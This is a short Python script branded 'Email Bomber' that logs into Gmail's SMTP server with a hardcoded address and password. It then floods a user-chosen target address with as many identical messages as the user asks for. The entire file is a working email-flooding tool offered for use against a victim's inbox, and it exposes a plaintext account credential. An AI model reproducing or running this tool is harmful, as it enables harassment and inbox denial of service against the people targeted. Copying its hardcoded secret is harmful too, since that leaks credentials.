import smtplib
import pyfiglet
from colorama import Fore, Style, init
import os

os.system("clear")
# Initialize colorama
init(autoreset=True)

# Logo Banner
logo = pyfiglet.figlet_format("Email Bomber")
print(Fore.RED + logo)
print(Fore.YELLOW + "Author:" + Fore.GREEN + " Showrav")
print(Fore.YELLOW + "Team  :" + Fore.GREEN + " STLP\n")

# SMTP Setup
server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

# Login
print(Fore.CYAN + "[*] Logging in...")
server.login("shawon256@gmail.com", "bojegyboswyqspxl")
print(Fore.GREEN + "[✓] Login successful!\n")

# Inputs
to = input(Fore.MAGENTA + "Enter Target Email: ")
limit = int(input(Fore.MAGENTA + "Enter Your Target Limit: "))

# Message
msg = "Subject: Test Mail\n\nThis is a test from Email Bomber."

# Sending Loop
print(Fore.YELLOW + "\n[*] Sending Emails...\n")
for i in range(1, limit + 1):  # Start from 1
    server.sendmail("shawon256@gmail.com", to, msg)
    print(Fore.GREEN + f"{i}. Sent Successfully ✔")

print(Fore.BLUE + "\nAll emails sent successfully.")